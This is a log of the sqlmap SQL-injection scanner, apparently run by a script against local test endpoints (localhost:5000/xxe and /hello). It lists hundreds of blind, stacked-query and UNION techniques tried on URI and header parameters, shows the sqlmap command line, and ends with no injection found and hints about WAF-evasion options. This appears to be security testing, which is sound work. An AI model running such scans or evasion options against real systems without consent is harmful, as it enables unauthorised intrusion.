[18:54:10] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[18:54:10] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[18:54:10] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[18:54:10] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
[18:54:10] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
[18:54:10] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
[18:54:10] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:54:10] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
[18:54:10] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:54:10] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
[18:54:10] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:54:10] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
[18:54:10] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
[18:54:10] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[18:54:12] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[18:54:12] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[18:54:12] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[18:54:13] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[18:54:13] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
[18:54:14] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
[18:54:14] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
[18:54:15] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
[18:54:15] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[18:54:16] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:54:16] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[18:54:17] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[18:54:17] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[18:54:18] [WARNING] URI parameter '#1*' does not seem to be injectable
other non-custom parameters found. Do you want to process them too? [Y/n/q] Y
[18:54:18] [INFO] testing if parameter 'User-Agent' is dynamic
[18:54:18] [WARNING] parameter 'User-Agent' does not appear to be dynamic
[18:54:18] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
[18:54:18] [INFO] testing for SQL injection on parameter 'User-Agent'
[18:54:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:54:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[18:54:19] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[18:54:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:54:20] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:54:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[18:54:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[18:54:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[18:54:21] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:54:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:54:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[18:54:21] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:54:22] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:54:22] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[18:54:23] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:54:23] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:54:24] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:54:24] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:54:24] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:54:25] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:54:25] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[18:54:26] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[18:54:26] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:54:27] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:54:27] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:54:27] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:54:28] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:54:28] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[18:54:28] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[18:54:28] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[18:54:28] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[18:54:28] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[18:54:28] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[18:54:28] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[18:54:28] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[18:54:28] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[18:54:28] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[18:54:28] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
[18:54:28] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
[18:54:28] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
[18:54:28] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
[18:54:28] [INFO] testing 'Informix boolean-based blind - Parameter replace'
[18:54:28] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
[18:54:28] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
[18:54:28] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
[18:54:28] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[18:54:28] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[18:54:28] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[18:54:28] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[18:54:28] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:54:28] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:54:28] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:54:28] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:54:28] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[18:54:29] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[18:54:29] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[18:54:29] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
[18:54:29] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
[18:54:29] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
[18:54:29] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:54:29] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
[18:54:29] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:54:29] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
[18:54:29] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:54:29] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
[18:54:29] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
[18:54:29] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[18:54:29] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[18:54:29] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[18:54:29] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[18:54:30] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[18:54:30] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
[18:54:30] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
[18:54:30] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
[18:54:30] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
[18:54:31] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
[18:54:31] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:54:31] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[18:54:32] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[18:54:32] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[18:54:33] [WARNING] parameter 'User-Agent' does not seem to be injectable
[18:54:33] [INFO] testing if parameter 'Referer' is dynamic
[18:54:33] [WARNING] parameter 'Referer' does not appear to be dynamic
[18:54:33] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be injectable
[18:54:33] [INFO] testing for SQL injection on parameter 'Referer'
[18:54:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:54:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[18:54:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[18:54:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:54:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:54:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[18:54:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[18:54:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[18:54:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:54:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:54:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[18:54:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:54:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:54:37] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[18:54:37] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:54:37] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:54:38] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:54:38] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:54:39] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:54:39] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:54:40] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[18:54:40] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[18:54:41] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:54:41] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:54:42] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:54:42] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:54:42] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:54:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[18:54:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[18:54:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[18:54:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[18:54:42] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[18:54:43] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[18:54:43] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[18:54:43] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[18:54:43] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[18:54:43] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[18:54:43] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
[18:54:43] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
[18:54:43] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
[18:54:43] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
[18:54:43] [INFO] testing 'Informix boolean-based blind - Parameter replace'
[18:54:43] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
[18:54:43] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
[18:54:43] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
[18:54:43] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[18:54:43] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[18:54:43] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[18:54:43] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[18:54:43] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:54:43] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:54:43] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:54:43] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:54:43] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[18:54:43] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[18:54:43] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[18:54:43] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
[18:54:43] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
[18:54:43] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
[18:54:43] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:54:43] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
[18:54:43] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:54:43] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
[18:54:43] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:54:43] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
[18:54:43] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
[18:54:43] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[18:54:43] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[18:54:43] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[18:54:43] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[18:54:44] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[18:54:44] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
[18:54:44] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
[18:54:44] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
[18:54:45] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
[18:54:45] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
[18:54:45] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:54:46] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[18:54:46] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[18:54:47] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[18:54:47] [WARNING] parameter 'Referer' does not seem to be injectable
[18:54:47] [INFO] testing if parameter 'Host' is dynamic
[18:54:47] [WARNING] parameter 'Host' does not appear to be dynamic
[18:54:47] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
[18:54:47] [INFO] testing for SQL injection on parameter 'Host'
[18:54:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:54:48] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[18:54:49] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[18:54:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:54:49] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:54:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[18:54:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[18:54:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[18:54:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:54:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:54:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[18:54:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:54:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:54:51] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[18:54:52] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:54:52] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:54:53] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:54:53] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:54:54] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:54:55] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:54:55] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[18:54:56] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[18:54:56] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:54:57] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:54:57] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:54:58] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:54:58] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:54:58] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[18:54:58] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[18:54:59] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[18:54:59] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[18:54:59] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[18:54:59] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[18:54:59] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[18:54:59] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[18:54:59] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[18:54:59] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[18:54:59] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
[18:54:59] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
[18:54:59] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
[18:54:59] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
[18:54:59] [INFO] testing 'Informix boolean-based blind - Parameter replace'
[18:54:59] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
[18:54:59] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
[18:54:59] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
[18:54:59] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[18:54:59] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[18:54:59] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[18:54:59] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[18:54:59] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:54:59] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:54:59] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:54:59] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:54:59] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[18:54:59] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[18:54:59] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[18:54:59] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
[18:54:59] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
[18:54:59] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
[18:54:59] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:54:59] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
[18:54:59] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:54:59] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
[18:54:59] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:54:59] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
[18:54:59] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
[18:54:59] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[18:55:00] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[18:55:00] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[18:55:00] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[18:55:00] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[18:55:01] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
[18:55:01] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
[18:55:01] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
[18:55:01] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
[18:55:01] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
[18:55:02] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:55:02] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[18:55:03] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[18:55:04] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[18:55:04] [WARNING] parameter 'Host' does not seem to be injectable
[18:55:04] [CRITICAL] all tested parameters do not appear to be injectable. Rerun without providing the option '--technique'. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[18:55:04] [WARNING] HTTP error codes detected during run:
405 (Method Not Allowed) - 5160 times, 404 (Not Found) - 2360 times

[*] ending @ 18:55:04 /2025-09-26/

2025-09-26 18:55:04,857 - INFO - No clear injection detected during discovery for http://localhost:5000/xxe
2025-09-26 18:55:04,857 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/hello
2025-09-26 18:55:08,795 - INFO -         ___
2025-09-26 18:55:08,795 - INFO -        __H__
2025-09-26 18:55:08,795 - INFO -  ___ ___[.]_____ ___ ___  {1.9.9.4#dev}
2025-09-26 18:55:08,795 - INFO - |_ -| . ["]     | .'| . |
2025-09-26 18:55:08,795 - INFO - |___|_  [']_|_|_|__,|  _|
2025-09-26 18:55:08,795 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 18:55:08,795 - INFO - 
2025-09-26 18:55:08,826 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 18:55:08,826 - INFO - 
2025-09-26 18:55:08,826 - INFO - [*] starting @ 18:55:08 /2025-09-26/
2025-09-26 18:55:08,826 - INFO - 
2025-09-26 18:55:11,200 - INFO - [18:55:11] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
2025-09-26 18:55:11,200 - INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
2025-09-26 18:55:11,210 - INFO - [18:55:11] [INFO] flushing session file
2025-09-26 18:55:11,221 - INFO - [18:55:11] [INFO] testing connection to the target URL
2025-09-26 18:55:11,278 - INFO - [18:55:11] [INFO] checking if the target is protected by some kind of WAF/IPS
2025-09-26 18:55:11,303 - INFO - [18:55:11] [INFO] testing if the target URL content is stable
2025-09-26 18:55:11,739 - INFO - [18:55:11] [INFO] target URL content is stable
2025-09-26 18:55:11,739 - INFO - [18:55:11] [INFO] testing if URI parameter '#1*' is dynamic
2025-09-26 18:55:11,770 - INFO - [18:55:11] [WARNING] URI parameter '#1*' does not appear to be dynamic
2025-09-26 18:55:11,797 - INFO - [18:55:11] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
2025-09-26 18:55:11,813 - INFO - [18:55:11] [INFO] testing for SQL injection on URI parameter '#1*'
2025-09-26 18:55:11,873 - INFO - [18:55:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:55:11,977 - INFO - [18:55:11] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 18:55:12,002 - INFO - [18:55:12] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:55:12,074 - INFO - [18:55:12] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
2025-09-26 18:55:12,135 - INFO - [18:55:12] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
